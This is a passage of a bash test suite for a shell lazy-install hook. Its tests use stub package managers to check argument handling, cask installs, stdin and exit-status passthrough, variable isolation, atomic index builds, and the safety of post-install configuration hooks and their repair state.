maidx="$tmp/maidx.tsv"; printf 'multitool\tmultitool\tpkg-a pkg-b pkg-c\n' > "$maidx"   # brew col = 3 space-joined pkgs
printf '#!/usr/bin/env bash\nprintf "%%s\\n" "$@" > "%s/margs"\nprintf "#!/usr/bin/env bash\\necho ok\\n" > "%s/multitool"\nchmod +x "%s/multitool"\n' "$tmp" "$mabin" "$mabin" > "$mabin/brew"; chmod +x "$mabin/brew"
rm -f "$mabin/multitool" "$tmp/margs"
CNF_ALLOW_NONINTERACTIVE=1 PATH="$mabin:$PATH" CNF_INDEX="$maidx" CNF_LOCK_DIR="$tmp/malocks" __cnf_resolve multitool >/dev/null 2>&1 || true
if [ "$(wc -l < "$tmp/margs" 2>/dev/null | tr -d ' ')" = 4 ] && [ "$(sed -n 2p "$tmp/margs" 2>/dev/null)" = "pkg-a" ] && [ "$(sed -n 4p "$tmp/margs" 2>/dev/null)" = "pkg-c" ]; then
  pass "D03/E07 — array installer value installs as SEPARATE args (brew got 'install pkg-a pkg-b pkg-c', not one joined package; #163)"
else
  fail "array pkg serialization: brew args=[$(tr '\n' ',' < "$tmp/margs" 2>/dev/null)] (want install,pkg-a,pkg-b,pkg-c as 4 lines)"
fi

# 14. F02/D06 — CASK DETECTION: a cask-ONLY app (cask column set, brew column empty — 253 such GUI apps:
# aerospace/alt-tab/android-studio/…) must install via `brew install --cask`. There is NO standalone `cask`
# binary, so the manager-availability check must test `brew` (not `command -v cask`, which always fails →
# the cask branch is never selected → every cask-only app silently un-lazy-installable). __cnf_os forced to
# darwin (in a subshell) so the pref tries cask first on ANY runner; fake brew records args + creates the tool.
ckbin="$tmp/ckbin"; mkdir -p "$ckbin"
ckidx="$tmp/ckidx.tsv"
printf 'casktool\tcasktool\t\t\t\t\tcasktool-app\n' > "$ckidx"   # col 7 (cask)=casktool-app; brew (col3) EMPTY
printf '#!/usr/bin/env bash\nprintf "%%s\\n" "$@" > "%s/ckargs"\nprintf "#!/usr/bin/env bash\\necho ok\\n" > "%s/casktool"\nchmod +x "%s/casktool"\n' "$tmp" "$ckbin" "$ckbin" > "$ckbin/brew"; chmod +x "$ckbin/brew"
rm -f "$ckbin/casktool" "$tmp/ckargs"
( __cnf_os(){ echo darwin; }; CNF_ALLOW_NONINTERACTIVE=1 PATH="$ckbin:$PATH" CNF_INDEX="$ckidx" CNF_LOCK_DIR="$tmp/cklocks" __cnf_resolve casktool ) >/dev/null 2>&1 || true
if grep -qx -- '--cask' "$tmp/ckargs" 2>/dev/null && grep -qx 'casktool-app' "$tmp/ckargs" 2>/dev/null; then
  pass "F02/D06 — cask-only app installs via 'brew install --cask' (manager check uses brew, not the nonexistent 'cask' binary; #164)"
else
  fail "cask detection: brew args=[$(tr '\n' ',' < "$tmp/ckargs" 2>/dev/null)] (want install,--cask,casktool-app)"
fi

# 15. E08/E15 — STREAM + EXIT-STATUS fidelity (the transparent-shim property; §5 golden path
# "executes once with preserved argv/streams/status"). argv (#163 + boundaries) + stdout (#7) are
# already covered; this adds the two gaps a real pipeline/script depends on:
#   (a) the piped STDIN reaches the RESOLVED command — the install is `</dev/null` so it can't eat
#       the command's stdin, but the resolved command must still RECEIVE it (line 227 `"$cmd" "$@"`
#       inherits the shell's stdin, not the install's /dev/null);
#   (b) the resolved command's EXIT STATUS propagates as the handler's return code (line 227 `rc=$?`
#       → 229 `return "$rc"`), so `if missingtool; then` and `missingtool; echo $?` behave correctly.
# (a) stdin passthrough — fake brew installs 'stintool' = cat; piping DATA in must echo DATA back.
sibin="$tmp/sibin"; mkdir -p "$sibin"
siidx="$tmp/siidx.tsv"; printf 'stintool\tstintool\tstintool\n' > "$siidx"
printf '#!/usr/bin/env bash\nprintf "#!/usr/bin/env bash\\ncat\\n" > "%s/stintool"\nchmod +x "%s/stintool"\n' "$sibin" "$sibin" > "$sibin/brew"; chmod +x "$sibin/brew"
rm -f "$sibin/stintool"
siout="$(printf 'STDIN_PASSTHRU_77' | PATH="$sibin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_INDEX="$siidx" CNF_LOCK_DIR="$tmp/silocks" __cnf_resolve stintool 2>/dev/null)"
[ "$siout" = "STDIN_PASSTHRU_77" ] && pass "E08/E15 — piped STDIN reaches the resolved command (install </dev/null doesn't eat it)" || fail "stdin passthrough broken: got '$siout' (want STDIN_PASSTHRU_77)"
# (b) exit-status — fake brew installs 'rctool' that exits 42; the handler must return 42.
rcbin="$tmp/rcbin"; mkdir -p "$rcbin"
rcidx="$tmp/rcidx.tsv"; printf 'rctool\trctool\trctool\n' > "$rcidx"
printf '#!/usr/bin/env bash\nprintf "#!/usr/bin/env bash\\nexit 42\\n" > "%s/rctool"\nchmod +x "%s/rctool"\n' "$rcbin" "$rcbin" > "$rcbin/brew"; chmod +x "$rcbin/brew"
rm -f "$rcbin/rctool"
PATH="$rcbin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_INDEX="$rcidx" CNF_LOCK_DIR="$tmp/rclocks" __cnf_resolve rctool >/dev/null 2>&1; rcrc=$?
[ "$rcrc" = 42 ] && pass "E08 — resolved command's EXIT STATUS propagates (rctool exit 42 → handler rc 42)" || fail "exit-status not preserved: handler rc=$rcrc (want 42)"

# 16. E07 — the hook MUST NOT persistently mutate the parent (interactive) shell. Every working var in
# __cnf_resolve/__cnf_do_install is `local`; a single dropped `local` would leak into the user's shell on
# EVERY missing command (e.g. clobber their $rest/$row/$col). Run the resolve IN THE CURRENT shell (a
# subshell would hide a leak), CNF_NO_EXEC so it installs-but-doesn't-run, then assert the hook-only
# internals are unset afterward. The checked names are used by the hook but NOT by this test
# (lock/acq/pref/row/mbin/rest/__t0/__dur/tok) so a pre-existing test global can't mask a real leak.
# Non-vacuity proven: dropping `lock acq` from the line-163 `local` makes them leak → this FAILs.
lkbin="$tmp/lkbin"; mkdir -p "$lkbin"
lkidx="$tmp/lkidx.tsv"; printf 'leaktool\tleaktool\tleaktool\n' > "$lkidx"
printf '#!/usr/bin/env bash\nprintf "#!/usr/bin/env bash\\necho ok\\n" > "%s/leaktool"\nchmod +x "%s/leaktool"\n' "$lkbin" "$lkbin" > "$lkbin/brew"; chmod +x "$lkbin/brew"
rm -f "$lkbin/leaktool"
unset lock acq pref row mbin rest __t0 __dur tok 2>/dev/null || true
CNF_NO_EXEC=1 CNF_ALLOW_NONINTERACTIVE=1 CNF_JOURNAL="$tmp/lkjournal" PATH="$lkbin:$PATH" CNF_INDEX="$lkidx" CNF_LOCK_DIR="$tmp/lklocks" __cnf_resolve leaktool >/dev/null 2>&1
leaked=""
for v in lock acq pref row mbin rest __t0 __dur tok; do
  eval "__lk=\${$v+SET}"
  [ "${__lk:-}" = SET ] && leaked="$leaked $v"
done
[ -z "$leaked" ] && pass "E07 — hook leaks no internals into the parent shell (all __cnf_resolve/__cnf_do_install vars are local)" || fail "parent-env leak: hook left [$leaked ] set in the caller's shell (a dropped 'local')"

# 17. D13/B07 — index-build ATOMICITY + "cleaned on any exit": the builder writes a temp `.cnf-index.XXXXXX`
# in the OUT dir then atomically `mv`s it into place (a concurrent reader never sees a partial index), and an
# EXIT trap removes the temp on ANY exit. The clobber-safety half (a failed build keeps the prior index, #13
# above) is covered; this asserts the UNtested half — NO `.cnf-index.*` temp litter remains after EITHER a
# successful OR a failed build (a broken trap would strand temp files in the OUT dir, e.g. ~/.local/bin).
# Non-vacuity proven: commenting the line-27 EXIT trap leaves the temp after a failed build → (b) FAILs.
if { command -v yq > /dev/null 2>&1 && command -v jq > /dev/null 2>&1; } || python3 -c 'import yaml' 2> /dev/null; then
  atdir="$tmp/atomic"; mkdir -p "$atdir"
  # (a) successful build -> OUT complete + zero temp litter (the mv consumed the temp; trap disarmed)
  bash "$BUILDER" "$SW" "$atdir/index.tsv" > /dev/null 2>&1
  litter_s="$(find "$atdir" -maxdepth 1 -name '.cnf-index.*' 2> /dev/null | wc -l | tr -d ' ')"
  { [ -s "$atdir/index.tsv" ] && [ "$litter_s" = 0 ]; } && pass "D13/B07 — successful build: atomic rename, zero temp litter in OUT dir" || fail "atomicity(success): empty index or temp litter ($litter_s)"
  # (b) failed build (unterminated-flow YAML -> parser error) -> prior index INTACT + zero temp litter
  before="$(wc -l < "$atdir/index.tsv" | tr -d ' ')"
  printf 'softwarePackages: [\n' > "$atdir/bad.yml"
  bash "$BUILDER" "$atdir/bad.yml" "$atdir/index.tsv" > /dev/null 2>&1 && bfail=0 || bfail=1
  after="$(wc -l < "$atdir/index.tsv" | tr -d ' ')"
  litter_f="$(find "$atdir" -maxdepth 1 -name '.cnf-index.*' 2> /dev/null | wc -l | tr -d ' ')"
  { [ "$bfail" = 1 ] && [ "$before" = "$after" ] && [ "$litter_f" = 0 ]; } && pass "D13/B07 — failed build: prior index intact + zero temp litter (EXIT trap cleaned up)" || fail "atomicity(fail): bfail=$bfail before=$before after=$after litter=$litter_f"
else
  skip "no yq+jq or python3+pyyaml — index atomicity test skipped"
fi

# fire #192 — E12/V02/E14 degraded-index SELF-HEAL: a TRUNCATED (0-byte) index must rebuild, not sit dead.
# The reader gated self-heal on `[ -f ]`, which is TRUE for a 0-byte file — so an empty/truncated index
# (an interrupted or external write, disk-full) silently disabled lazy-install with NO recovery. Fixed to
# `[ -s ]` (exists AND non-empty). Hermetic: an EMPTY index + a stub cnf-build-index on PATH that touches a
# sentinel; after a dry-run resolve the sentinel must exist (self-heal fired). RED pre-fix (an empty file
# is "present" under `[ -f ]` → no rebuild → no sentinel).
shdir="$(mktemp -d)"; shidx="$shdir/index.tsv"; shsent="$shdir/builder-ran"
: > "$shidx"  # EMPTY (0-byte) index — the degenerate case
cat > "$shdir/cnf-build-index" <<SHBUILD
#!/usr/bin/env bash
: > "$shsent"
printf 'selfhealtool\tselfhealtool\tselfhealtool\t\t\t\t\t\t\t\t\t\t\t\t\n' > "$shidx"
SHBUILD
chmod +x "$shdir/cnf-build-index"
PATH="$shdir:$PATH" CNF_INDEX="$shidx" CNF_DRY=1 __cnf_resolve selfhealtool >/dev/null 2>&1 || true
{ [ -f "$shsent" ]; } && pass "E12/V02 — EMPTY (0-byte) index SELF-HEALS (rebuilds via cnf-build-index; [ -s ] not [ -f ])" || fail "empty index did NOT self-heal — lazy-install would sit dead (cnf-build-index not invoked)"
rm -rf "$shdir"

# 18. R14/F06 — lazy-install POST-INSTALLX HOOK auto-dispatch: when a tool with a `post-<key>.sh` hook in
# `~/.local/bin/post-installx/` is lazy-installed on first use, the hook automatically runs (stdin-isolated
# `</dev/null` and stdout->stderr `>&2` so the resolved command's stdout stays clean).
# These are deterministic hook/repair lifecycle tests, not an ambient-host
# sandbox probe. Substitute only the execution boundary here; dedicated L06
# assertions below restore and exercise the production boundary fail-closed.
cnf_production_isolated="$(declare -f __cnf_run_hook_isolated)"
__cnf_run_hook_isolated() { /bin/bash "$1"; }
phdir="$(mktemp -d)"; phbin="$phdir/bin"; phhooks="$phdir/hooks"; mkdir -p "$phbin" "$phhooks"
phidx="$phdir/index.tsv"; printf 'cfgbin\tcfgpkg\tcfgpkg\n' > "$phidx"
printf '#!/usr/bin/env bash\nprintf "#!/usr/bin/env bash\\necho CFG_CLEAN_STDOUT\\n" > "%s/cfgbin"\nchmod +x "%s/cfgbin"\n' "$phbin" "$phbin" > "$phbin/brew"; chmod +x "$phbin/brew"
printf '#!/usr/bin/env bash\necho HOOK_NOISE_TO_STDOUT\n: > "%s/hook-ran"\n' "$phdir" > "$phhooks/post-cfgpkg.sh"; chmod +x "$phhooks/post-cfgpkg.sh"
phout="$(PATH="$phbin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_INDEX="$phidx" CNF_LOCK_DIR="$phdir/locks" CNF_POST_HOOK_DIR="$phhooks" __cnf_resolve cfgbin 2>/dev/null)"
{ [ -f "$phdir/hook-ran" ] && [ "$phout" = "CFG_CLEAN_STDOUT" ]; } && pass "R14/F06 — lazy install auto-runs post-<key>.sh config hook with clean stdout isolation" || fail "post-installx hook on lazy install failed (ran=$([ -f "$phdir/hook-ran" ] && echo y || echo n) out='$phout')"

# Configuration is part of the owning lazy-install operation: a failed hook must not execute the
# newly installed command or emit a successful-install journal record.
rm -f "$phbin/cfgbin" "$phdir/hook-ran" "$phdir/failed.ndjson"
printf '#!/usr/bin/env bash\nif [ ! -f "%s/first-failure" ]; then : > "%s/first-failure"; exit 23; fi\n: > "%s/configured"\n' "$phdir" "$phdir" "$phdir" > "$phhooks/post-cfgpkg.sh"; chmod +x "$phhooks/post-cfgpkg.sh"
PATH="$phbin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_JOURNAL="$phdir/failed.ndjson" CNF_INDEX="$phidx" CNF_LOCK_DIR="$phdir/locks-failed" CNF_REPAIR_DIR="$phdir/repair" CNF_POST_HOOK_DIR="$phhooks" __cnf_resolve cfgbin >/dev/null 2>&1; phrc=$?
if [ "$phrc" -ne 0 ] && ! grep -q '"outcome":"installed"' "$phdir/failed.ndjson" 2>/dev/null; then
  pass "R14/F06 — failed lazy post-install hook fails the owning operation without success evidence"
else
  fail "failed lazy post-install hook was treated as success (rc=$phrc journal=$(cat "$phdir/failed.ndjson" 2>/dev/null))"
fi

# L05/L06: configuration debt survives the binary becoming available, is private and bound to the
# exact command/package/hook/index evidence, then one explicit bounded repair atomically clears it.
phstate="$phdir/repair/cfgbin.repair"
phmode="$(stat -c '%a' "$phstate" 2>/dev/null || stat -f '%Lp' "$phstate" 2>/dev/null)"
if [ -f "$phstate" ] && [ ! -L "$phstate" ] && [ "$phmode" = 600 ] \
  && grep -qx 'cmd=cfgbin' "$phstate" && grep -qx 'key=cfgpkg' "$phstate" \
  && grep -q '^hook_sha256=[a-f0-9]\{64\}$' "$phstate" && grep -q '^index_sha256=[a-f0-9]\{64\}$' "$phstate"; then
  pass "L05/L06 — failed configuration persists private command/package/hook/index-bound repair state"
else
  fail "repair state missing, unsafe, or unbound (mode=$phmode state=$(cat "$phstate" 2>/dev/null))"
fi
PATH="$phbin:$PATH" CNF_INDEX="$phidx" CNF_REPAIR_DIR="$phdir/repair" CNF_POST_HOOK_DIR="$phhooks" cnf_repair cfgbin >/dev/null 2>&1; phrepair=$?
if [ "$phrepair" -eq 0 ] && [ -f "$phdir/configured" ] && [ ! -e "$phstate" ]; then
  pass "L05/L06 — explicit repair succeeds after binary exists and atomically clears configuration debt"
else
  fail "durable repair failed rc=$phrepair configured=$([ -f "$phdir/configured" ] && echo y || echo n) state=$([ -e "$phstate" ] && echo present || echo cleared)"
fi

# Exact binding is fail-closed: a changed package row cannot redirect a saved repair to another hook.
rm -f "$phdir/configured" "$phdir/first-failure" "$phbin/cfgbin"
PATH="$phbin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_INDEX="$phidx" CNF_LOCK_DIR="$phdir/locks-binding" CNF_REPAIR_DIR="$phdir/repair" CNF_POST_HOOK_DIR="$phhooks" __cnf_resolve cfgbin >/dev/null 2>&1 || true
printf 'cfgbin\totherpkg\totherpkg\n' > "$phidx"
PATH="$phbin:$PATH" CNF_INDEX="$phidx" CNF_REPAIR_DIR="$phdir/repair" CNF_POST_HOOK_DIR="$phhooks" cnf_repair cfgbin >/dev/null 2>&1; phbindrc=$?
if [ "$phbindrc" -ne 0 ] && [ ! -f "$phdir/configured" ] && [ -f "$phstate" ]; then
  pass "L05/L06 — repair rejects changed index/package binding without executing configuration"
else
  fail "repair accepted changed binding rc=$phbindrc configured=$([ -f "$phdir/configured" ] && echo y || echo n)"
fi

# A symlinked debt record is never read, executed, or removed.
rm -f "$phstate"; printf 'do-not-touch\n' > "$phdir/target"; ln -s "$phdir/target" "$phstate"
PATH="$phbin:$PATH" CNF_INDEX="$phidx" CNF_REPAIR_DIR="$phdir/repair" CNF_POST_HOOK_DIR="$phhooks" cnf_repair cfgbin >/dev/null 2>&1; phsymlinkrc=$?
if [ "$phsymlinkrc" -ne 0 ] && [ -L "$phstate" ] && grep -qx 'do-not-touch' "$phdir/target"; then
  pass "L05/L06 — repair state is symlink-safe and leaves the target untouched"
else
  fail "symlinked repair state was accepted or altered rc=$phsymlinkrc"
fi

# An interrupted repair keeps its exact debt record and can be retried successfully. The bounded
# runner must also advertise the no-service-auto-enable policy to the selected hook.
rm -f "$phstate" "$phbin/cfgbin" "$phdir/debt-created" "$phdir/repair-entered" "$phdir/interrupted-configured"
printf 'cfgbin\tcfgpkg\tcfgpkg\n' > "$phidx"
printf '#!/usr/bin/env bash\nif [ ! -f "%s/debt-created" ]; then : > "%s/debt-created"; exit 23; fi\n[ "${INSTALL_DOCTOR_NO_SERVICE_AUTO_ENABLE:-}" = 1 ] || exit 24\n: > "%s/repair-entered"\nwhile [ -f "%s/hold-repair" ]; do sleep 0.1; done\n: > "%s/interrupted-configured"\n' "$phdir" "$phdir" "$phdir" "$phdir" "$phdir" > "$phhooks/post-cfgpkg.sh"; chmod +x "$phhooks/post-cfgpkg.sh"
PATH="$phbin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_INDEX="$phidx" CNF_LOCK_DIR="$phdir/locks-interrupt" CNF_REPAIR_DIR="$phdir/repair" CNF_POST_HOOK_DIR="$phhooks" __cnf_resolve cfgbin >/dev/null 2>&1 || true
: > "$phdir/hold-repair"
( PATH="$phbin:$PATH" CNF_INDEX="$phidx" CNF_REPAIR_DIR="$phdir/repair" CNF_POST_HOOK_DIR="$phhooks" CNF_REPAIR_TIMEOUT=10 cnf_repair cfgbin ) >/dev/null 2>&1 & phrepairpid=$!
phwait=0; while [ ! -f "$phdir/repair-entered" ] && [ "$phwait" -lt 50 ]; do sleep 0.1; phwait=$((phwait + 1)); done
kill -TERM "$phrepairpid" 2>/dev/null || true; wait "$phrepairpid" 2>/dev/null; phinterrupt=$?
if [ "$phinterrupt" -ne 0 ] && [ -f "$phstate" ] && [ ! -f "$phdir/interrupted-configured" ]; then
  pass "L05/L06 — interrupted bounded repair preserves debt and does not report configuration success"
else
  fail "interrupted repair lost debt or reported success rc=$phinterrupt state=$([ -f "$phstate" ] && echo present || echo missing)"
fi
rm -f "$phdir/hold-repair"
# Simulate a legacy/crash-truncated ownerless lock. It may self-heal only after explicit bounded age proof.
rm -f "$phstate.lock/owner" "$phstate.lock/hook-owner" 2>/dev/null || true
sleep 1
PATH="$phbin:$PATH" CNF_INDEX="$phidx" CNF_REPAIR_DIR="$phdir/repair" CNF_REPAIR_LOCK_STALE=0 CNF_POST_HOOK_DIR="$phhooks" cnf_repair cfgbin >/dev/null 2>&1; phretryrc=$?
if [ "$phretryrc" -eq 0 ] && [ -f "$phdir/interrupted-configured" ] && [ ! -e "$phstate" ]; then
  pass "L05/L06 — interrupted repair retries once and clears debt only after hook success"
else
  fail "post-interruption retry failed rc=$phretryrc state=$([ -e "$phstate" ] && echo present || echo cleared)"
fi

# The public entrypoint is subshell-isolated: missing/no-op repairs cannot erase or replace caller traps,
# and an unchanged second run cannot rerun a completed hook or recreate debt.
trap 'true' INT
phtrap_before="$(trap -p INT)"
phmtime="$(stat -c %Y "$phdir/interrupted-configured" 2>/dev/null || stat -f %m "$phdir/interrupted-configured")"
PATH="$phbin:$PATH" CNF_INDEX="$phidx" CNF_REPAIR_DIR="$phdir/repair" CNF_POST_HOOK_DIR="$phhooks" cnf_repair cfgbin >/dev/null 2>&1; phnooprc=$?
phtrap_after="$(trap -p INT)"; trap - INT
phmtime_after="$(stat -c %Y "$phdir/interrupted-configured" 2>/dev/null || stat -f %m "$phdir/interrupted-configured")"
if [ "$phnooprc" -ne 0 ] && [ "$phtrap_before" = "$phtrap_after" ] && [ "$phmtime" = "$phmtime_after" ] && [ ! -e "$phstate" ]; then
  pass "L05/L06 — unchanged second repair is a no-op and preserves caller traps"
else
  fail "unchanged repair mutated state or caller traps rc=$phnooprc"
fi

# Service activation is rejected before hook execution, not merely discouraged through an env hint.
eval "$cnf_production_isolated"
rm -f "$phbin/cfgbin" "$phdir/service-attempt" "$phdir/service-first"
printf '#!/usr/bin/env bash\nset -e\nif [ ! -f "%s/service-first" ]; then : > "%s/service-first"; exit 23; fi\ncase "$(uname -s)" in Darwin) actuator=/bin/launchctl; "$actuator" load /definitely/not/a/service.plist;; Linux) actuator="$(command -v systemctl)"; "$actuator" enable definitely-not-a.service;; *) exit 78;; esac\n: > "%s/service-attempt"\n' "$phdir" "$phdir" "$phdir" > "$phhooks/post-cfgpkg.sh"; chmod +x "$phhooks/post-cfgpkg.sh"
PATH="$phbin:$PATH" CNF_ALLOW_NONINTERACTIVE=1 CNF_INDEX="$phidx" CNF_LOCK_DIR="$phdir/locks-service" CNF_REPAIR_DIR="$phdir/repair-service" CNF_POST_HOOK_DIR="$phhooks" __cnf_resolve cfgbin >/dev/null 2>&1 || true
phservicemsg="$(PATH="$phbin:$PATH" CNF_INDEX="$phidx" CNF_REPAIR_DIR="$phdir/repair-service" CNF_POST_HOOK_DIR="$phhooks" cnf_repair cfgbin 2>&1 >/dev/null)"; phservicerc=$?
if [ "$phservicerc" -ne 0 ] && [ ! -f "$phdir/service-attempt" ] && printf '%s' "$phservicemsg" | grep -q "selectedServices entry 'cfgpkg'"; then
  pass "L06 — capability sandbox blocks dynamic absolute-path service activation and hands off to desired state"
else
  fail "service activation hook was not rejected rc=$phservicerc"
fi

rm -f "$phdir/no-boundary-ran"
printf '#!/usr/bin/env bash\n: > "%s/no-boundary-ran"\n' "$phdir" > "$phhooks/no-boundary.sh"; chmod +x "$phhooks/no-boundary.sh"
( __cnf_trusted_root_binary(){ return 1; }; __cnf_run_hook_isolated "$phhooks/no-boundary.sh" ) >/dev/null 2>&1; phboundaryrc=$?
if [ "$phboundaryrc" -eq 78 ] && [ ! -f "$phdir/no-boundary-ran" ]; then
  pass "L06 — missing enforceable platform primitive fails closed without executing the hook"
else
  fail "hook ran without a trusted enforcement primitive rc=$phboundaryrc"
fi

if ! grep -vE '^[[:space:]]*#' "$HANDLER" | grep -qE '^[[:space:]]*(sudo[[:space:]]+)?(systemctl|launchctl)[[:space:]].*(enable|start)|^[[:space:]]*brew[[:space:]]+services[[:space:]]+(start|restart)'; then
  pass "L06 — lazy runtime and repair entrypoint never auto-enable or start services"
else
  fail "lazy runtime contains an implicit service enable/start operation"
fi
rm -rf "$phdir"

say "command-not-found: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
